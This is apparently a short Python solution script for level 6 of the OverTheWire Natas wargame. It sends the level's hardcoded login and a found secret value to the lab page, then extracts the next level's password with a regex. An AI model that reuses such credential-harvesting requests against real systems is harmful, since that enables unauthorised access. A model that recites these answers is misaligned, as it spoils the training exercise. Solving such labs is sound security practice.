#!/usr/bin/env python

import requests
import re

username = 'natas6'
password = 'fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR'

url = 'http://%s.natas.labs.overthewire.org/' % username

# response = requests.get(url, auth=(username, password))
response = requests.post(url, data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit": "submit"}, auth=(username, password))

content = response.text

# print(content)

print(re.findall('The password for natas7 is (.*)',content)[0])